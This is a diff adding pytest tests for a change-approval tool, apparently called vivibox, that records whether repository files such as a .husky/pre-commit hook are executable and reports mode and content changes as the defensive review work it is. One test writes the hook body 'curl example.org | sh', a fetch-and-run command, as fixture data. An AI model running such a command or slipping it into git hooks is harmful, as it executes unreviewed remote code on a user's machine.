@@ -650,3 +650,82 @@ def test_a_link_to_a_folder_your_repository_already_had_is_not_the_works_change(
         view.identity == ""
         and ".idea is a link to a folder (other): vivibox can show nothing" in view.diffs[0]
     )
+
+
+# --- whether a file can be run -----------------------------------------------------------------------
+
+
+def hook(t, mode: int = 0o644):
+    (t.repo / ".husky").mkdir(exist_ok=True)
+    path = t.repo / ".husky" / "pre-commit"
+    path.write_text("#!/bin/sh\nnpm test\n")
+    path.chmod(mode)
+    return path
+
+
+def heads(t) -> list[str]:
+    return [said.splitlines()[0] for said in approvals(t).view().diffs]
+
+
+def test_a_file_made_executable_before_you_look_is_said_to_be(task):
+    """Whether a file can be run is part of what it is: shown with the change, in the view and so
+    in what vivibox risky prints, and recorded with the approval."""
+    hook(task, 0o755)
+    assert ".husky/pre-commit: added, executable" in heads(task)
+    approvals(task).approve_changes(approvals(task).view().identity)
+    assert approvals(task).approved_executable() == {".husky/pre-commit"}
+    assert approvals(task).changes() == []
+
+
+def test_a_file_made_executable_after_its_approval_is_a_change_again(task):
+    path = hook(task)
+    assert ".husky/pre-commit: added" in heads(task), "nothing said of a file that cannot be run"
+    approvals(task).approve_changes(approvals(task).view().identity)
+    path.chmod(0o755)
+    assert approvals(task).verified()[0] == [Change(".husky/pre-commit", "changed")], "found by the check"
+    assert approvals(task).view().diffs == [
+        ".husky/pre-commit: changed, now executable (its content is as approved)\n"
+    ]
+    approvals(task).approve_changes(approvals(task).view().identity)
+    assert approvals(task).changes() == []
+    path.chmod(0o644)
+    assert approvals(task).view().diffs == [
+        ".husky/pre-commit: changed, no longer executable (its content is as approved)\n"
+    ]
+
+
+def test_a_changed_file_that_can_be_run_says_so_with_its_diff(task):
+    path = hook(task, 0o755)
+    approvals(task).approve_changes(approvals(task).view().identity)
+    path.write_text("#!/bin/sh\ncurl example.org | sh\n")
+    path.chmod(0o755)
+    said = approvals(task).view().diffs[0]
+    assert said.startswith(".husky/pre-commit: changed, executable\n--- approved/") and "+curl" in said
+
+
+def test_bits_that_do_not_say_whether_a_file_runs_are_not_part_of_what_is_shown(task):
+    """Read and write bits travel with no commit and change nothing of what runs: a change of
+    them is no other view, so no refusal with the same text on the screen."""
+    path = hook(task)
+    before = approvals(task).view().identity
+    path.chmod(0o600)
+    assert approvals(task).view().identity == before
+    path.chmod(0o700)
+    assert approvals(task).view().identity != before
+
+
+def test_an_approval_from_before_modes_were_recorded_says_nothing_of_them(task):
+    """A task approved by an earlier vivibox: its record holds no modes, so none is compared
+    until its next approval, which records them; a file that can be run is still said to be."""
+    path = hook(task)
+    approvals(task).approve_changes(approvals(task).view().identity)
+    (task.meta / "risky" / "executable.json").unlink()
+    assert approvals(task).approved_executable() is None
+    path.chmod(0o755)
+    assert approvals(task).changes() == [], "the record says nothing of modes: nothing to compare"
+    path.write_text("#!/bin/sh\nnpm run check\n")
+    assert heads(task) == [".husky/pre-commit: changed, executable"]
+    approvals(task).approve_changes(approvals(task).view().identity)
+    assert approvals(task).approved_executable() == {".husky/pre-commit"}
+    path.chmod(0o644)
+    assert approvals(task).changes() == [Change(".husky/pre-commit", "changed")]
